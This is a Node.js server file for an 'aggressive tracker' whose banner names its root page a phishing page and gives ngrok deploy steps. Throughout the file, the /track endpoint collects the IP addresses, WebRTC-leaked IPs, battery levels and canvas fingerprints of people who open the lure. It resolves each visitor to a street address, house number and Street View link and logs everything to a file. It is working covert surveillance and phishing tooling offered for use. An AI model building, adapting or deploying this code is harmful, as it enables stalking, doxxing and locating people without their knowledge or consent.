// Save as `server.js`
const http = require('http');
const fs = require('fs');
const url = require('url');
const crypto = require('crypto');
const path = require('path');

const PORT = 3000;
let tracks = [];
let activeSessions = new Map();

// ==================== AGGRESSIVE GEOLOCATION - REAL ONLY ====================
function getRealGeoWithAddress(ip, callback) {
  const cleanIp = ip.replace(/^::ffff:/, '');
  const privateRanges = ['127.', '10.', '192.168.', '172.16.', '::1', '169.254.'];
  
  if (privateRanges.some(r => cleanIp.startsWith(r))) {
    return callback(null);
  }
  
  // Try multiple geolocation services for maximum accuracy
  const services = [
    `http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city,lat,lon,isp,org,mobile,proxy,hosting,query`,
    `https://ipapi.co/${cleanIp}/json/`,
    `https://json.geoiplookup.io/${cleanIp}`
  ];
  
  let serviceIndex = 0;
  
  function tryNextService() {
    if (serviceIndex >= services.length) {
      return callback(null);
    }
    
    const service = services[serviceIndex];
    serviceIndex++;
    
    http.get(service, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const geo = JSON.parse(data);
          
          // Handle different API formats
          let lat, lon, city, country, isp, mobile, proxy, hosting;
          
          if (geo.status === 'success' || geo.lat) {
            // ip-api.com format
            lat = parseFloat(geo.lat || geo.latitude);
            lon = parseFloat(geo.lon || geo.longitude);
            city = geo.city || geo.regionName || geo.region;
            country = geo.country || geo.country_name;
            isp = geo.isp || geo.org || geo.asn || geo.isp_name;
            mobile = geo.mobile || false;
            proxy = geo.proxy || false;
            hosting = geo.hosting || false;
            
            if (lat && lon && !isNaN(lat) && !isNaN(lon)) {
              // Success! Now get street address
              return getStreetAddress(lat, lon, city, country, isp, mobile, proxy, hosting, geo.query || cleanIp, callback);
            }
          }
          
          // If we get here, try next service
          tryNextService();
        } catch(e) {
          tryNextService();
        }
      });
    }).on('error', tryNextService);
  }
  
  function getStreetAddress(lat, lon, city, country, isp, mobile, proxy, hosting, ip, callback) {
    // Add delay to respect rate limits (1 request per second)
    setTimeout(() => {
      http.get(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, (revRes) => {
        let addrData = '';
        revRes.on('data', c => addrData += c);
        revRes.on('end', () => {
          try {
            const address = JSON.parse(addrData);
            
            callback({
              city: city || address.address?.city || address.address?.town || address.address?.village || 'Unknown',
              lat, lon,
              isp: isp || 'Unknown',
              country: country || address.address?.country || 'Unknown',
              region: address.address?.state || address.address?.region || address.address?.county || '',
              mobile: !!mobile,
              proxy: !!proxy,
              hosting: !!hosting,
              ip: ip,
              address: address.display_name || `${city || ''}, ${country || ''}`.trim() || `${lat.toFixed(4)}, ${lon.toFixed(4)}`,
              street: address.address?.road || address.address?.pedestrian || address.address?.street || '',
              house: address.address?.house_number || '',
              neighbourhood: address.address?.neighbourhood || address.address?.suburb || address.address?.quarter || '',
              postcode: address.address?.postcode || '',
              mapsLink: `https://www.google.com/maps?q=${lat},${lon}`,
              streetView: `https://www.google.com/maps/@${lat},${lon},18z?entry=ttu`,
              real: true
            });
          } catch(e) {
            // Fallback to just lat/lon if reverse geocoding fails
            callback({
              city: city || 'Unknown',
              lat, lon,
              isp: isp || 'Unknown',
              country: country || 'Unknown',
              mobile: !!mobile,
              proxy: !!proxy,
              hosting: !!hosting,
              ip: ip,
              address: `${city || ''}, ${country || ''}`.trim() || `${lat.toFixed(4)}, ${lon.toFixed(4)}`,
              mapsLink: `https://www.google.com/maps?q=${lat},${lon}`,
              streetView: `https://www.google.com/maps/@${lat},${lon},18z?entry=ttu`,
              real: true
            });
          }
        });
      }).on('error', () => {
        callback({
          city: city || 'Unknown',
          lat, lon,
          isp: isp || 'Unknown',
          country: country || 'Unknown',
          mobile: !!mobile,
          proxy: !!proxy,
          hosting: !!hosting,
          ip: ip,
          address: `${city || ''}, ${country || ''}`.trim() || `${lat.toFixed(4)}, ${lon.toFixed(4)}`,
          mapsLink: `https://www.google.com/maps?q=${lat},${lon}`,
          streetView: `https://www.google.com/maps/@${lat},${lon},18z?entry=ttu`,
          real: true
        });
      });
    }, 1000); // 1 second delay to respect Nominatim rate limits
  }
  
  // Start trying services
  tryNextService();
}

// ==================== SERVER ====================
const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  
  // ========== TRACK ENDPOINT - AGGRESSIVE DATA COLLECTION ==========
  if (parsed.pathname === '/track') {
    const sessionId = parsed.query.session || crypto.randomBytes(8).toString('hex');
    const trackType = parsed.query.type || 'fingerprint';
    
    const track = {
      id: crypto.randomBytes(4).toString('hex'),
      sessionId,
      ts: new Date().toISOString(),
      ip: clientIp,
      type: trackType,
      ua: req.headers['user-agent'],
      ref: req.headers.referer || '',
      data: parsed.query
    };
    
    activeSessions.set(sessionId, { lastSeen: Date.now(), ip: clientIp });
    
    getRealGeoWithAddress(clientIp, geo => {
      if (geo) {
        track.geo = geo;
        console.log(`\n🎯 HIT [${track.ts.slice(11,19)}] ${track.id}`);
        console.log(`📍 ${geo.address.substring(0, 80)}${geo.address.length > 80 ? '...' : ''}`);
        if (geo.house && geo.street) console.log(`🏠 ${geo.house} ${geo.street}`);
        console.log(`🗺️  ${geo.mapsLink}`);
        console.log(`📶 ${geo.isp} (${geo.mobile ? '📱 MOBILE' : '💻 FIXED'})`);
        if (parsed.query.webrtc_ips) console.log(`🌐 WebRTC: ${parsed.query.webrtc_ips}`);
        if (parsed.query.battery_level) console.log(`🔋 Battery: ${parsed.query.battery_level}%`);
        if (parsed.query.canvas1) console.log(`🖌️ Canvas FP captured`);
      } else {
        console.log(`\n⚠️  [${track.ts.slice(11,19)}] ${track.id} - PRIVATE/VPN IP`);
        console.log(`   IP: ${clientIp}`);
        if (parsed.query.webrtc_ips) console.log(`   🌐 WebRTC leak: ${parsed.query.webrtc_ips}`);
      }
      
      tracks.unshift(track);
      if (tracks.length > 1000) tracks.length = 1000;
      
      fs.appendFileSync('tracks.jsonl', JSON.stringify(track) + '\n');
    });
    
    res.writeHead(200);
    res.end(`OK|${sessionId}`);
    return;
  }
  
  // ========== API ENDPOINTS ==========
  if (parsed.pathname === '/api/tracks') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(tracks.slice(0, 50)));
    return;
  }
  
  if (parsed.pathname === '/api/stats') {
    const stats = {
      total: tracks.length,
      withLocation: tracks.filter(t => t.geo && t.geo.real).length,
      noLocation: tracks.filter(t => !t.geo || !t.geo.real).length,
      webrtcLeaks: tracks.filter(t => t.data && t.data.webrtc_ips && t.data.webrtc_ips !== 'none').length,
      batteryData: tracks.filter(t => t.data && t.data.battery_level).length,
      activeSessions: activeSessions.size
    };
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(stats));
    return;
  }
  
  // ========== RELEASE SESSION ==========
  if (parsed.pathname === '/release' && parsed.query.session) {
    activeSessions.delete(parsed.query.session);
    res.writeHead(200);
    res.end('RELEASED');
    return;
  }
  
  // ========== CLEAR ALL DATA ==========
  if (parsed.pathname === '/clear' && req.method === 'POST') {
    tracks = [];
    activeSessions.clear();
    res.writeHead(200);
    res.end('CLEARED');
    return;
  }
  
  // ========== SERVE STATIC FILES ==========
  if (parsed.pathname === '/' || parsed.pathname === '/maps') {
    fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
      if (err) {
        res.writeHead(404);
        res.end('index.html not found');
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(data);
    });
    return;
  }
  
  if (parsed.pathname === '/dashboard') {
    fs.readFile(path.join(__dirname, 'dashboard.html'), (err, data) => {
      if (err) {
        res.writeHead(404);
        res.end('dashboard.html not found');
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(data);
    });
    return;
  }
  
  res.writeHead(404);
  res.end('Not found');
});

// ==================== START SERVER ====================
server.listen(PORT, '0.0.0.0', () => {
  console.log('\n' + '═'.repeat(90));
  console.log('🎯 AGGRESSIVE TRACKER - PRODUCTION READY');
  console.log('═'.repeat(90));
  console.log(`🎣 PHISH PAGE:    http://localhost:${PORT}/`);
  console.log(`📊 DASHBOARD:     http://localhost:${PORT}/dashboard`);
  console.log(`📁 LOG FILE:      tracks.jsonl`);
  console.log(`🔌 API:           http://localhost:${PORT}/api/tracks`);
  console.log(`📊 STATS:         http://localhost:${PORT}/api/stats`);
  console.log('\n✅ REAL GEOLOCATION WITH FALLBACKS');
  console.log('✅ STREET ADDRESS REVERSE GEOCODING');
  console.log('✅ SESSION TRACKING & RELEASE');
  console.log('✅ WEBRTC MULTI-IP LEAK DETECTION');
  console.log('✅ CANVAS/WEBGL/AUDIO FINGERPRINTING');
  console.log('\n🚀 DEPLOY:');
  console.log('   node server.js');
  console.log('   npx ngrok http 3000');
  console.log('═'.repeat(90));
});
